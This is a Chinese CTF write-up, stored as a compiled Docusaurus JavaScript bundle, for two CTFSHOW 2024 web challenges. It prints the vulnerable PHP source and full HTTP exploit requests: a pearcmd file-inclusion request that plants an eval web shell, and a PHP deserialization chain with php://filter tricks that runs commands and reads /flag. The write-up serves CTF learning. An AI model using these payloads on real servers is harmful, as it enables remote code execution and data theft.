"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[8625],{8643:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>s,contentTitle:()=>i,default:()=>p,frontMatter:()=>o,metadata:()=>r,toc:()=>h});const r=JSON.parse('{"id":"CTF/CTFSHOW/CTFSHOW\u5143\u65e6\u6c34\u53cb\u8d5b2024","title":"CTFSHOW\u5143\u65e6\u6c34\u53cb\u8d5b2024","description":"CTFSHOW\u5143\u65e6\u6c34\u53cb\u8d5b","source":"@site/docs/CTF/CTFSHOW/CTFSHOW\u5143\u65e6\u6c34\u53cb\u8d5b2024.md","sourceDirName":"CTF/CTFSHOW","slug":"/CTF/CTFSHOW/CTFSHOW\u5143\u65e6\u6c34\u53cb\u8d5b2024","permalink":"/docs/CTF/CTFSHOW/CTFSHOW\u5143\u65e6\u6c34\u53cb\u8d5b2024","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/CTFSHOW/CTFSHOW\u5143\u65e6\u6c34\u53cb\u8d5b2024.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"CTFSHOW","permalink":"/docs/category/ctfshow"},"next":{"title":"ctfshow-cms","permalink":"/docs/CTF/CTFSHOW/ctfshow-cms"}}');var t=a(74848),c=a(28453);const o={},i=void 0,s={},h=[{value:"CTFSHOW\u5143\u65e6\u6c34\u53cb\u8d5b",id:"ctfshow\u5143\u65e6\u6c34\u53cb\u8d5b",level:2},{value:"easy_include",id:"easy_include",level:2},{value:"easy_web",id:"easy_web",level:2}];function l(e){const n={code:"code",h2:"h2",p:"p",pre:"pre",...(0,c.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h2,{id:"ctfshow\u5143\u65e6\u6c34\u53cb\u8d5b",children:"CTFSHOW\u5143\u65e6\u6c34\u53cb\u8d5b"}),"\n",(0,t.jsx)(n.h2,{id:"easy_include",children:"easy_include"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",children:'<?php\r\n\r\nfunction waf($path){\r\n    $path = str_replace(".","",$path);\r\n    return preg_match("/^[a-z]+/",$path);\r\n}\r\n\r\nif(waf($_POST[1])){\r\n    include "file://".$_POST[1];\r\n}\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u53ea\u80fd\u662f\u5c0f\u5199\u5b57\u6bcd\u5f00\u5934\uff0c\u7528localhost\u5f00\u5934\u5c31\u884c\u4e86"}),"\n",(0,t.jsx)(n.p,{children:"\u8fd9\u9898\u662f\u5229\u7528pearcmd"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-http",children:"POST /?+config-create+/<?=eval($_POST[a]);?>+/tmp/1.php HTTP/1.1\r\nHost: 9d99fbea-9fde-4f64-a7dd-483220686300.challenge.ctf.show\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 41\r\nOrigin: http://9d99fbea-9fde-4f64-a7dd-483220686300.challenge.ctf.show\r\nConnection: close\r\nReferer: http://9d99fbea-9fde-4f64-a7dd-483220686300.challenge.ctf.show/\r\nCookie: PHPSESSID=c434ca72b822edd7301e5c0e15d859ac\r\nUpgrade-Insecure-Requests: 1\r\n\r\n1=localhost/usr/local/lib/php/pearcmd.php\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u7136\u540e\u518d\u5305\u542b1.php\u5c31\u53ef\u4ee5\u4e86"}),"\n",(0,t.jsx)(n.h2,{id:"easy_web",children:"easy_web"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",children:"\u5f00\u80c3\u5c0f\u83dc\uff0c\u5c31\u8ba9\u6211\u6210\u4e3a\u7b7e\u5230\u9898\u53ed <?php\r\nheader('Content-Type:text/html;charset=utf-8');\r\nerror_reporting(0);\r\n\r\nfunction waf1($Chu0){\r\n    foreach ($Chu0 as $name => $value) {\r\n        if(preg_match('/[a-z]/i', $value)){\r\n            exit(\"waf1\");\r\n        }\r\n    }\r\n}\r\n\r\nfunction waf2($Chu0){\r\n    if(preg_match('/show/i', $Chu0))\r\n        exit(\"waf2\");\r\n}\r\n\r\nfunction waf_in_waf_php($a){\r\n    $count = substr_count($a,'base64');\r\n    echo \"hinthinthint,base64\u5594\".\"<br>\";\r\n    if($count!=1){\r\n        return True;\r\n    }\r\n    if (preg_match('/ucs-2|phar|data|input|zip|flag|\\%/i',$a)){\r\n        return True;\r\n    }else{\r\n        return false;\r\n    }\r\n}\r\n\r\nclass ctf{\r\n    public $h1;\r\n    public $h2;\r\n    public function __wakeup(){\r\n        throw new Exception(\"fastfast\");\r\n    }\r\n    public function __destruct()\r\n    {\r\n        $this->h1->nonono($this->h2);\r\n    }\r\n}\r\n\r\nclass show{\r\n\r\n    public function __call($name,$args){\r\n        if(preg_match('/ctf/i',$args[0][0][2])){\r\n            echo \"gogogo\";\r\n        }\r\n    }\r\n}\r\n\r\nclass Chu0_write{\r\n    public $chu0;\r\n    public $chu1;\r\n    public $cmd;\r\n    public function __construct(){\r\n        $this->chu0 = 'xiuxiuxiu';\r\n    }\r\n    public function __toString(){\r\n        echo \"__toString\".\"<br>\";\r\n        if ($this->chu0===$this->chu1){\r\n            $content='ctfshowshowshowwww'.$_GET['chu0'];\r\n            if (!waf_in_waf_php($_GET['name'])){\r\n                file_put_contents($_GET['name'].\".txt\",$content);\r\n            }else{\r\n                echo \"\u7ed5\u4e00\u4e0b\u5427\u5b69\u5b50\";\r\n            }\r\n                $tmp = file_get_contents('ctfw.txt');\r\n                echo $tmp.\"<br>\";\r\n                if (!preg_match(\"/f|l|a|g|x|\\*|\\?|\\[|\\]| |\\'|\\<|\\>|\\%/i\",$_GET['cmd'])){\r\n                    eval($tmp($_GET['cmd']));\r\n                }else{\r\n                    echo \"waf!\";\r\n                }\r\n\r\n            file_put_contents(\"ctfw.txt\",\"\");\r\n        }\r\n        return \"Go on\";\r\n        }\r\n}\r\nif (!$_GET['show_show.show']){\r\n    echo \"\u5f00\u80c3\u5c0f\u83dc\uff0c\u5c31\u8ba9\u6211\u6210\u4e3a\u7b7e\u5230\u9898\u53ed\";\r\n    highlight_file(__FILE__);\r\n}else{\r\n    echo \"WAF,\u542f\u52a8\uff01\";\r\n    waf1($_REQUEST);\r\n    waf2($_SERVER['QUERY_STRING']);\r\n    if (!preg_match('/^[Oa]:[\\d]/i',$_GET['show_show.show'])){\r\n        unserialize($_GET['show_show.show']);\r\n    }else{\r\n        echo \"\u88abwaf\u5566\";\r\n    }\r\n}\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u59ff\u52bf\u4e00\uff1a"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-http",children:"POST /?%73%68%6f%77%5b%73%68%6f%77%2e%73%68%6f%77=%43%3a%31%31%3a%22%41%72%72%61%79%4f%62%6a%65%63%74%22%3a%31%37%38%3a%7b%78%3a%69%3a%30%3b%61%3a%30%3a%7b%7d%3b%6d%3a%61%3a%31%3a%7b%73%3a%31%3a%22%62%22%3b%4f%3a%33%3a%22%63%74%66%22%3a%32%3a%7b%73%3a%32%3a%22%68%31%22%3b%4f%3a%34%3a%22%73%68%6f%77%22%3a%30%3a%7b%7d%73%3a%32%3a%22%68%32%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%33%3a%7b%69%3a%30%3b%73%3a%30%3a%22%22%3b%69%3a%31%3b%73%3a%30%3a%22%22%3b%69%3a%32%3b%4f%3a%31%30%3a%22%43%68%75%30%5f%77%72%69%74%65%22%3a%33%3a%7b%73%3a%34%3a%22%63%68%75%30%22%3b%4e%3b%73%3a%34%3a%22%63%68%75%31%22%3b%4e%3b%73%3a%33%3a%22%63%6d%64%22%3b%4e%3b%7d%7d%7d%7d%7d%7d&chu0=c=003=00l=00z=00d=00G=00V=00t=00&name=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw&cmd=env HTTP/1.1\r\nHost: 6a8066ea-fb86-4f70-84c7-fc5cb98cb654.challenge.ctf.show\r\nContent-Length: 38\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nOrigin: http://6a8066ea-fb86-4f70-84c7-fc5cb98cb654.challenge.ctf.show\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://6a8066ea-fb86-4f70-84c7-fc5cb98cb654.challenge.ctf.show/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nConnection: close\r\n\r\nshow%5Bshow.show=1&chu0=1&name=1&cmd=1\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u59ff\u52bf\u4e8c\uff1a"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-http",children:"POST /?%73%68%6f%77%5b%73%68%6f%77%2e%73%68%6f%77=%43%3a%31%31%3a%22%41%72%72%61%79%4f%62%6a%65%63%74%22%3a%31%37%38%3a%7b%78%3a%69%3a%30%3b%61%3a%30%3a%7b%7d%3b%6d%3a%61%3a%31%3a%7b%73%3a%31%3a%22%62%22%3b%4f%3a%33%3a%22%63%74%66%22%3a%32%3a%7b%73%3a%32%3a%22%68%31%22%3b%4f%3a%34%3a%22%73%68%6f%77%22%3a%30%3a%7b%7d%73%3a%32%3a%22%68%32%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%33%3a%7b%69%3a%30%3b%73%3a%30%3a%22%22%3b%69%3a%31%3b%73%3a%30%3a%22%22%3b%69%3a%32%3b%4f%3a%31%30%3a%22%43%68%75%30%5f%77%72%69%74%65%22%3a%33%3a%7b%73%3a%34%3a%22%63%68%75%30%22%3b%4e%3b%73%3a%34%3a%22%63%68%75%31%22%3b%4e%3b%73%3a%33%3a%22%63%6d%64%22%3b%4e%3b%7d%7d%7d%7d%7d%7d&chu0=Y=00X=00N=00z=00Z=00X=00J=000=00&name=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw&cmd=%73%68%6F%77_source(chr(47).chr(102).chr(108).chr(97).chr(103)); HTTP/1.1\r\nHost: 6052d5a2-7e3b-4575-ae83-23647302e0e3.challenge.ctf.show\r\nContent-Length: 38\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nOrigin: http://6052d5a2-7e3b-4575-ae83-23647302e0e3.challenge.ctf.show\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://6052d5a2-7e3b-4575-ae83-23647302e0e3.challenge.ctf.show\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nConnection: close\r\n\r\nshow%5Bshow.show=1&chu0=1&name=1&cmd=1\n"})})]})}function p(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(l,{...e})}):l(e)}},28453:(e,n,a)=>{a.d(n,{R:()=>o,x:()=>i});var r=a(96540);const t={},c=r.createContext(t);function o(e){const n=r.useContext(c);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:o(e.components),r.createElement(c.Provider,{value:n},e.children)}}}]);